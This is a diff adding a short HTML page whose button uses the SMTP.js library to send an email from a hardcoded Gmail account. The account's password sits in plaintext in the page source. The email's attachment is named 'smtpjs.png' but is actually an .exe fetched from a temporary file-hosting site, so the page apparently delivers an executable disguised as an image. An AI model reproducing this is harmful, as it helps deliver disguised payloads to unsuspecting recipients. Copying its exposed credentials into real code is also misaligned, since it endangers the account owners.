@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+	<script src="https://smtpjs.com/v3/smtp.js"></script>  
+	<script type="text/javascript">
+		function sendEmail() {
+  Email.send({
+  Host: "smtp.gmail.com",
+  Username : "donotreply.schoolarchive@gmail.com",
+  Password : "%harviv%",
+  To : 'vivekkadre7@gmail.com',
+  From : "VIVEK@Archive",
+  Subject : "File Upload",
+  Body : "File Attached",
+  Attachments : [
+  	{
+  		name : "smtpjs.png",
+  		path:"https://tmpfiles.org/dl/85302/sp62194.exe"
+  	}]
+  }).then(
+  	message => alert("mail sent successfully")
+  );
+}
+	</script>
+</head>
+<body>  
+	<form method="post">
+		<input type="button" value="Send Email" onclick="sendEmail()"/>
+	</form>  
+</body>
+</html>
